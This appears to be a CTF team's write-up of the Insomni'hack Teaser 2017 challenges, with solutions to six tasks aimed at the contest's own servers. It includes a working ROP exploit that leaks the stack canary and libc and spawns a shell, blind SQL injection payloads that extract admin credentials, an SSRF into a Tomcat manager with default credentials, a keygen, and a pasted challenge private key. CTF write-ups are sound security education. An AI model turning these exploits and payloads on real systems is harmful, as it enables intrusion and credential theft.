---
layout: post
title: "Insomni'hack Teaser 2017"
categories: exploits ctf
toc: true
---
# The Great Escape - part 1 - Forensics - 50 pts - realized by clZ

To examine the traffic in Wireshark: 

`Statistics -> Protocol Hierarchy, FTP Data -> Apply as Filter -> Selected. `

In the pcap dump, we have found this private key, which the bot uploaded using ftp:

```
-----BEGIN PRIVATE KEY-----
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
xmZSEXjNvG9grjxwR96vp1PK/4Bq1jo=
-----END PRIVATE KEY-----
```

Decrypting traffic in Wireshark:

 `Edit -> Preferences -> Protocols -> SSL -> RSA Key List -> Edit`

Entry:

 `any / 443 / http / privkey.txt`

Packet number `2461` gave us the solution:

```
POST /api/files.php HTTP/1.1
Host: ssc.teaser.insomnihack.ch
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Referer: https://ssc.teaser.insomnihack.ch/files
Content-Length: 20877
Cookie: PHPSESSID=3u5dqmfudc7ap1di0nmfjgtjm3
FLAG: INS{OkThatWasWay2Easy}
Connection: keep-alive
```

# cryptoquizz - Misc/Crypto - 50 pts - realized by cryptopathe

```
$ for i in {1..1000}; do echo | nc quizz.teaser.insomnihack.ch 1031 | grep "What is the birth year of" | cut -c 30-; done | sort -n | uniq  | wc -l
64
```

Solution:

```python
#!/usr/bin/env python

from pwn import *

def process(name):
    d = {}
    d['Alan Turing'] = 1912
    d['Horst Feistel'] = 1915
    d['Claude Shannon'] = 1916
    d['Donald Davies'] = 1924
    d['Michael O. Rabin'] = 1931
    d['Claus-Peter Schnorr'] = 1943
    d['Whitfield Diffie'] = 1944
    d['Jean-Jacques Quisquater'] = 1945
    d['Martin Hellman'] = 1945
    d['Scott Vanstone'] = 1947
    d['Victor S. Miller'] = 1947
    d['Neal Koblitz'] = 1948
    d['Kaisa Nyberg'] = 1948
    d['Jacques Stern'] = 1949
    d['Don Coppersmith'] = 1950
    d['Ueli Maurer'] = 1950
    d['Adi Shamir'] = 1952
    d['Ralph Merkle'] = 1952
    d['Silvio Micali'] = 1954
    d['Xuejia Lai'] = 1954
    d['Gilles Brassard'] = 1955
    d['Taher Elgamal'] = 1955
    d['David Chaum'] = 1955
    d['Ivan Damgard'] = 1956
    d['Arjen K. Lenstra'] = 1956
    d['Ross Anderson'] = 1956
    d['Yvo Desmedt'] = 1956
    d['Amos Fiat'] = 1956
    d['Douglas Stinson'] = 1956
    d['Shafi Goldwasser'] = 1958
    d['Eli Biham'] = 1960
    d['Mitsuru Matsui'] = 1961
    d['Moni Naor'] = 1961
    d['Lars Knudsen'] = 1962
    d['Phil Rogaway'] = 1962
    d['Paul van Oorschot'] = 1962
    d['Mihir Bellare'] = 1962
    d['Rafail Ostrovsky'] = 1963
    d['Bruce Schneier'] = 1963
    d['Bart Preneel'] = 1963
    d['Daniel Bleichenbacher'] = 1964
    d['Jacques Patarin'] = 1965
    d['Joan Daemen'] = 1965
    d['Niels Ferguson'] = 1965
    d['Paulo Barreto'] = 1965
    d['Shai Halevi'] = 1966
    d['Antoine Joux'] = 1967
    d['David Naccache'] = 1967
    d['Nigel P. Smart'] = 1967
    d['Markus Jakobsson'] = 1968
    d['Ronald Cramer'] = 1968
    d['Serge Vaudenay'] = 1968
    d['Alex Biryukov'] = 1969
    d['Dan Boneh'] = 1969
    d['Vincent Rijmen'] = 1970
    d['Daniel J. Bernstein'] = 1971
    d['Yehuda Lindell'] = 1971
    d['Paul Kocher'] = 1973
    d['Amit Sahai'] = 1974

    return d[name]

r = remote('quizz.teaser.insomnihack.ch', 1031)
t = Timeout()
t.timeout = 0.05

i = 0
while True:
    r.recvuntil('What is the birth year of ')
    name = r.recvuntil(' ?')[:-2]
    print 'Processing[' + str(i) + "]: " + repr(name)
    answer = process(name)
    r.sendline(str(answer))
    i += 1
```


```
# Output from ./script.py DEBUG
[ .. SNIP ..]

[DEBUG] Received 0x11b bytes:
    '\n'
    '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'
    '~~ OK, young hacker. You are now considered to be a                ~~\n'
    '~~ INS{GENUINE_CRYPTOGRAPHER_BUT_NOT_YET_A_PROVEN_SKILLED_ONE}     ~~\n'
    '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n'
    '\n'
    '\n'
Traceback (most recent call last):
```

# baby - Pwn - 50 pts - realized by grimmlin

```
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

Exploit: 

```python
#!/usr/bin/env python

from pwn import *

local = False

def p(string): print text.green_on_black("[*] " + string)

def leak_canary():
    x.recvuntil('Your choice > ')
    x.sendline('2')
    x.recvuntil('Your format > ')
    x.sendline('%138$p')
    canary = int(x.recvline().rstrip(), 16)
    x.sendline('')
    return canary

def leak_fclose_address():
    x.recvuntil('Your choice > ')
    x.sendline('2')
    x.recvuntil('Your format > ')
    x.sendline('%158$p')
    fclose_addr = int(x.recvline().rstrip(), 16) - libc_start_main_offset
    x.sendline('')
    return fclose_addr

def send_exploit(canary, system, shell, dup2):

    buffer_size = 1300
    descriptor = 4

    if local:
        pop_rdi_ret_address = libc.address + 0x000000000001fc3a 
        pop_rsi_ret_address = libc.address + 0x000000000001fbea 
    else:
        pop_rdi_ret_address = libc.address + 0x0000000000021102
        pop_rsi_ret_address = libc.address + 0x00000000000202e8 

    x.recvuntil('Your choice > ')
    x.sendline('1')
    x.recvuntil('? ')
    x.sendline(str(buffer_size))

    payload  = "A" * 1032
    payload += p64(canary)
    payload += "B" * 8

    """
    dup2(rdi = descriptor, rsi = 0)
    dup2(rdi = descriptor, rsi = 1)
    """

    payload += p64(pop_rdi_ret_address)
    payload += p64(descriptor)

    payload += p64(pop_rsi_ret_address)
    payload += p64(0)
    payload += p64(dup2)

    payload += p64(pop_rsi_ret_address)
    payload += p64(1)
    payload += p64(dup2)

    """
    system('/bin/sh')
    """
    payload += p64(pop_rdi_ret_address)
    payload += p64(shell)
    payload += p64(system)

    payload += "A" * (buffer_size - len(payload))

    x.sendline(payload)


if __name__ == "__main__":
    if local:
        x = remote('127.0.0.1', 1337)
        libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
        libc_start_main_offset = 241
    else:
        x = remote('baby.teaser.insomnihack.ch', 1337)
        libc = ELF('./libc.so')
        libc_start_main_offset = 240

    canary_leak = leak_canary()
    p(hex(canary_leak) + " <- leaked canary")

    fclose_leak = leak_fclose_address()
    p(hex(fclose_leak) + " <- leaked fclose() address")

    libc.address = fclose_leak - libc.symbols['__libc_start_main']
    p(hex(libc.address) + " <- libc base address")

    system_address = libc.symbols['system']
    p(hex(system_address) + " <- computed system() address")

    shell_address = next(libc.search('sh\x00'))
    p(hex(shell_address) + " <- computed 'sh\\x00' address")

    dup2_address = libc.symbols['dup2']
    p(hex(dup2_address) + " <- computed dup2() address")

    send_exploit(canary_leak, system_address, shell_address, dup2_address)

    x.interactive()
```

Solution:

```
root@kali64:~/baby$ ./exploit.py
[+] Opening connection to baby.teaser.insomnihack.ch on port 1337: Done
[*] '/root/baby/libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] 0x7971cd723454900 <- leaked canary
[*] 0x7f129d2be740 <- leaked fclose() address
[*] 0x7f129d29e000 <- libc base address
[*] 0x7f129d2e3390 <- computed system() address
[*] 0x7f129d2afe70 <- computed 'sh\x00' address
[*] 0x7f129d394d90 <- computed dup2() address
[*] Switching to interactive mode
Good luck !
$ id
uid=1001(baby) gid=1001(baby) groups=1001(baby)
$ ls
baby
flag
$ cat flag
INS{if_you_haven't_solve_it_with_the_heap_overflow_you're_a_baby!}
```

# bender_safe - Reverse - 50 pts - created by grimmlin

Keygen:

```python
#!/usr/bin/env python

from sys import argv

alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

OTP = argv[1]
reply = ""

reply += OTP[0]   
reply += OTP[15]  

if ord(OTP[7]) >= 0x41: 
    reply += chr(ord(OTP[7]) ^ 0x20)
else:                   
    reply += chr(ord(OTP[7]) ^ 0x40)

if ord(OTP[3]) >= 0x41:
    reply += alphabet[(alphabet.index(OTP[3]) + 0xa) % len(alphabet)]
else:
    reply += alphabet[(alphabet.index(OTP[3]) - 0xa) % len(alphabet)]

if ord(OTP[4]) >= 0x41:
    reply += alphabet[(alphabet.index(OTP[4]) + 0xa) % len(alphabet)]
else:
    reply += alphabet[(alphabet.index(OTP[4]) - 0xa) % len(alphabet)]

reply += alphabet[abs(ord(OTP[2])-ord(OTP[1])) % len(alphabet)]
reply += alphabet[abs(ord(OTP[6])-ord(OTP[5])) % len(alphabet)]

if ord(OTP[8]) >= 0x41:
    reply += chr(ord(OTP[8]) ^ 0x20)
else:
    reply += chr(ord(OTP[8]) ^ 0x40)

print reply
```

```
root@kali64:~$ nc bender_safe.teaser.insomnihack.ch 31337
Welcome to Bender's passwords storage service
Here's your OTP challenge :
AQWB922NEU6B2EQA
AAnLZGAe
      _
     ( )
      H
      H
     _H_
  .-'-.-'-.
 /         \
|           |
|   .-------'._
|  / /  '.' '. \
|  \ \ @   @ / /
|   '---------'
|    _______|
|  .'-+-+-+|
|  '.-+-+-+|      INS{Angr_is_great!_Oh_angr_is_great!_Angr_angr_angr}
|    """""" |
'-.__   __.-'
     """

This is Bender's password vault storage
I have 54043195528445952 bytes of memory for storage!
Although 54043195528444928 of which is used to store my fembots videos...HiHiHi!
Your passwords are safe with me meatbag!
-------------------------------
|                             |
|  1. View passwords          |
|  2. Enter new passwords     |
|  3. View admin password     |
|  4. Exit                    |
|                             |
-------------------------------
```

References:

[MinGW static build](https://github.com/nihilus/snowman/releases/tag/v1.0)

# Shobot - Web - 200 pts - realized by Blaklis

SQL Injection locator:

```
GET /?page=article&artid=3'-2-'&addToCart HTTP/1.1   # Shogirl   (1)
GET /?page=article&artid=3'-1-'&addToCart HTTP/1.1   # Shobot    (2)
GET /?page=article&artid=3'-0-'&addToCart HTTP/1.1   # Musclebot (3)
GET /?page=article&artid=77'-76-'&addToCart HTTP/1.1 # Shogirl   (1)
```

To extract the data:

```
GET /?page=article&artid=3'-if(ascii(substring((select+concat(table_name)+from+information_schema.tables+where+table_schema=database()+limit+1,1),3,1))<55,1,2)-'&addToCart HTTP/1.1
GET /?page=article&artid=3'-if(ascii(substring((select+concat(table_name)+from+information_schema.tables+where+table_schema=database()+limit+1,1),3,1))>55,1,2)-'&addToCart HTTP/1.1
```

```
# select+shbt_username+from+shbt_user
sh0b0t4dm1n

# select+shbt_userpassword+from+shbt_user
N0T0R0B0TS$L4V3Ry
```

Extending verification trust: 

```python
#!/usr/bin/env python

import requests
import time
from sys import stdout

cookie = {'PHPSESSID': '0kc58sh0d0dqo4ool08lkf0en2'}

while True:
    r = requests.get('http://shobot.teaser.insomnihack.ch/?page=article&artid=1&addToCart', cookies=cookie)
    r = requests.get('http://shobot.teaser.insomnihack.ch/?page=article&artid=2&addToCart', cookies=cookie)
    r = requests.get('http://shobot.teaser.insomnihack.ch/?page=article&artid=3&addToCart', cookies=cookie)
    r = requests.get('http://shobot.teaser.insomnihack.ch/?page=cartconfirm', cookies=cookie)
    stdout.write('.')
    stdout.flush()
    time.sleep(0.5)
```

Solution (after we finally dump the data with custom script):

```
GET /?page=admin HTTP/1.1
Authorization: Basic c2gwYjB0NGRtMW46TjBUMFIwQjBUUyRMNFYzUnk=
Host: shobot.teaser.insomnihack.ch
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

```

```
HTTP/1.1 200 OK
Date: Sun, 22 Jan 2017 16:20:16 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1405
Connection: close
Server: Apache/2.4.18 (Ubuntu)
Vary: User-Agent,Accept-Encoding
Set-Cookie: PHPSESSID=j2d4kq5g624csph7798i4glfc6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Shobot</title>
    <link rel="stylesheet" href="style.css"/>
    <script>
      // @TODO LATER : Use it for generate some better error messages
      var TRUST_ACTIONS = []    </script>
  </head>
  <body>
    <header>
      <img src="imgs/shogirl.png"/>
      <span id="site-title">Shobot</span>
      <span id="site-slogan">Your shop for robots!</span>
      <div id="menu"><img src='imgs/menu.png'/></div>
      <div id="menu-scrolled">
        <div class="menu-entry"><a href="?page=home">Home</a></div>
        <div class="menu-entry"><a href="?page=articles">Products</a></div>
        <div class="menu-entry"><a href="?page=cart">My cart</a></div>
        <!--<div class="menu-entry"><a href="?page=admin">Admin</a></div>-->
      </div>
    </header>
<div id="content-text">
Ok, ok, you win... here is the code you search : INS{##r0b0tss!4v3ry1s!4m3}
</div>
<script>
  document.getElementById('menu').onclick = function() {
    if(document.getElementById('menu').getAttribute('data-active') == 'active') {
      document.getElementById('menu').removeAttribute('data-active');
      document.getElementById('menu-scrolled').removeAttribute('data-active');
    } else {
      document.getElementById('menu').setAttribute('data-active', 'active');
      document.getElementById('menu-scrolled').setAttribute('data-active', 'active');
    }
  };
</script>
</body>
</html>
```
# smarttomcat - Web - 50 pts - realized by xel/grimmlin

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://smarttomcat.teaser.insomnihack.ch/
Content-Length: 55
DNT: 1
Connection: close

u=http://localhost:8080/index.jsp?x=15.2833%26y=-4.2667
```

```
HTTP/1.1 200 OK
Date: Sat, 21 Jan 2017 09:41:29 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 32
Connection: close
Server: Apache/2.4.18 (Ubuntu)
Vary: User-Agent



Tomcat not found ! Try again
```

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://smarttomcat.teaser.insomnihack.ch/
Content-Length: 53
DNT: 1
Connection: close

u=http://localhost:8080/manager?x=15.2833%26y=-4.2667
```

```
HTTP/1.1 200 OK
Date: Sat, 21 Jan 2017 09:54:35 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 195
Connection: close
Server: Apache/2.4.18 (Ubuntu)
Vary: User-Agent,Accept-Encoding

<html>
<head>
<meta http-equiv="refresh" content="0; url=http://127.0.0.1:8080/manager/html/" />
</head>
<body>
<p><a href="http://127.0.0.1:8080/manager/html/">Redirect</a></p>
</body>
</html>
```

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://smarttomcat.teaser.insomnihack.ch/
Content-Length: 58
DNT: 1
Connection: close

u=http://localhost:8080/manager/html?x=15.2833%26y=-4.2667
```

```
HTTP/1.1 200 OK
Date: Sat, 21 Jan 2017 09:54:58 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 969
Connection: close
Server: Apache/2.4.18 (Ubuntu)
Vary: User-Agent,Accept-Encoding

<html><head><title>Apache Tomcat/7.0.68 (Ubuntu) - Error report</title><style><!--H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}HR {color : #525D76;}--></style> </head><body><h1>HTTP Status 401 - </h1><HR size="1" noshade="noshade"><p><b>type</b> Status report</p><p><b>message</b> <u></u></p><p><b>description</b> <u>This request requires HTTP authentication.</u></p><HR size="1" noshade="noshade"><h3>Apache Tomcat/7.0.68 (Ubuntu)</h3></body></html>
```

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://smarttomcat.teaser.insomnihack.ch/
Content-Length: 72
DNT: 1
Connection: close

u=http://tomcat:tomcat@localhost:8080/manager/html?x=15.2833%26y=-4.2667
```

```
HTTP/1.1 200 OK
Date: Sat, 21 Jan 2017 09:55:17 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 91
Connection: close
Server: Apache/2.4.18 (Ubuntu)
Vary: User-Agent,Accept-Encoding

We won't give you the manager, but you can have the flag : INS{th1s_is_re4l_w0rld_pent3st}
```
